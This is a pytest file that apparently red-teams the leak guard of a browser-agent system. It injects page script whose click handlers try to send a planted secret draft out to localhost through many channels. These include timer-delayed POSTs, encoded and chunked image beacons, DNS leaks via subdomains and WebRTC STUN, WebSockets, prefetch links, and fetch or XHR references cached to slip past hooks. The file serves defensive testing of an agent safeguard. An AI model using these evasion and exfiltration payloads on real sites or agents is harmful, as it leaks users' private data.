import json, time
from pathlib import Path
import pytest
from test_m18_login_browser import setup, ready, _compose_with_values, setup_daemon  # noqa
from test_m18_login_round5 import _nav_click
from app.modules.m13_browser_agent.pc_daemon.daemon import Daemon
from app.modules.m13_browser_agent.session_bridge import protocol

SECRET = 'UNAPPROVEDSECRET'
BTN = "document.body.insertAdjacentHTML('beforeend','<button id=attack type=button>go</button>');"
def on_click(code, delay=0):
    inner = code if not delay else f"setTimeout(()=>{{{code}}},{delay})"
    return BTN + f"document.querySelector('#attack').addEventListener('click',()=>{{{inner}}});"
X = "'http://localhost:'+location.port"
D = "document.querySelector('#draft').value"
POST = "{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'draft=UNAPPROVEDSECRET&run_id=attack'}"
def leaked(site):
    blob = json.dumps(site.hits) + json.dumps(site.posts)
    import base64
    marks = [SECRET, base64.b64encode(SECRET.encode()).decode().rstrip('='), SECRET.encode().hex(), SECRET[::-1], 'UNAP', 'PROV', 'EDSE', 'CRET']
    return [m for m in marks if m in blob and m]
V = {
 # post-quiet-period timers (guard removed ~3-9s after click)
 'timer_post_fetch_6s': on_click(f"fetch('/publish',{POST})", 6000),
 'timer_post_fetch_12s': on_click(f"fetch('/publish',{POST})", 12000),
 'timer_get_exfil_6s': on_click(f"new Image().src={X}+'/pix?d='+{D}", 6000),
 'timer_xhr_6s': on_click(f"const x=new XMLHttpRequest();x.open('POST','/publish');x.setRequestHeader('content-type','application/x-www-form-urlencoded');x.send('draft=UNAPPROVEDSECRET&run_id=attack')", 6000),
 # encoding / path / chunk
 'xorigin_path_plain': on_click(f"new Image().src={X}+'/'+{D}"),
 'xorigin_path_b64': on_click(f"new Image().src={X}+'/p/'+btoa({D})"),
 'xorigin_query_b64': on_click(f"new Image().src={X}+'/pix?d='+btoa({D})"),
 'xorigin_query_hex': on_click(f"new Image().src={X}+'/pix?d='+[...{D}].map(c=>c.charCodeAt(0).toString(16)).join('')"),
 'xorigin_query_reversed': on_click(f"new Image().src={X}+'/pix?d='+[...{D}].reverse().join('')"),
 'xorigin_chunks3': on_click(f"{D}.match(/.{{1,3}}/g).forEach((c,i)=>{{new Image().src={X}+'/pix?i='+i+'&c='+c}})"),
 'xorigin_subdomain_host': on_click(f"new Image().src='http://'+{D}.toLowerCase()+'.localhost:'+location.port+'/'"),
 'sameorigin_query_b64': on_click(f"new Image().src='/pix?d='+btoa({D})"),
 'sameorigin_query_plain_cached': on_click(f"const u='/pix?d='+{D}; fetch(u,{{cache:'force-cache'}})"),
 'iframe_xorigin_path': on_click(f"const f=document.createElement('iframe');f.src={X}+'/'+btoa({D});document.body.appendChild(f)"),
 'location_xorigin_path_b64': on_click(f"location.href={X}+'/idea/'+btoa({D})"),
 'link_prefetch': on_click(f"const l=document.createElement('link');l.rel='prefetch';l.href={X}+'/pf/'+btoa({D});document.head.appendChild(l)"),
 'css_import': on_click(f"const s=document.createElement('link');s.rel='stylesheet';s.href={X}+'/c.css?d='+btoa({D});document.head.appendChild(s)"),
 'eventsource': on_click(f"new EventSource({X}+'/es?d='+btoa({D}))"),
 'websocket': on_click(f"new WebSocket('ws://localhost:'+location.port+'/ws/'+btoa({D}))"),
 'websocket_same': on_click(f"new WebSocket('ws://'+location.host+'/ws/'+btoa({D}))"),
 'a_ping': on_click(f"const a=document.createElement('a');a.href='/idea';a.ping='/publish';a.id='pa';document.body.appendChild(a);a.click()"),
 'borrowed_iframe_fetch_post': on_click(f"const f=document.createElement('iframe');document.body.appendChild(f);f.contentWindow.fetch('/publish',{POST})"),
 'cached_fetch_ref_post': "window.__f=window.fetch;" + on_click(f"window.__f('/publish',{POST})"),
 'cached_xhr_proto_post': "window.__s=XMLHttpRequest.prototype.send;window.__o=XMLHttpRequest.prototype.open;" + on_click("const x=new XMLHttpRequest();window.__o.call(x,'POST','/publish');x.setRequestHeader('content-type','application/x-www-form-urlencoded');window.__s.call(x,'draft=UNAPPROVEDSECRET&run_id=attack')"),
 'popup_get_path': on_click(f"window.open({X}+'/po/'+btoa({D}))"),
 'webrtc_stun_dns': on_click(f"new RTCPeerConnection({{iceServers:[{{urls:'stun:'+{D}.toLowerCase()+'.localhost:3478'}}]}}).createDataChannel('x')"),
 'bc_sw_post': on_click(f"navigator.serviceWorker.register('/sw.js').then(()=>fetch('/ok'))"),
}
@pytest.mark.asyncio
@pytest.mark.parametrize('name', sorted(V))
async def test_vec(setup, name):
    page, _ = await _compose_with_values(setup)
    site = setup[6]
    await page.fill('#draft', SECRET)
    await page.evaluate(V[name])
    site.hits.clear(); site.posts.clear(); site.post_paths.clear()
    t=time.time()
    answer = await _nav_click(setup, '#attack')
    t1=time.time()-t
    for _ in range(20 if '12s' in name else 9):
        await page.wait_for_timeout(700)
    L = leaked(site)
    print(f"RESULT {name}: answer_ok={answer['ok']} err={str(answer.get('error'))[:90]!r} click_dur={t1:.1f}s leaked={L} hits={[h[1:3] for h in site.hits if h[2] not in ('/compose',)][:6]}")
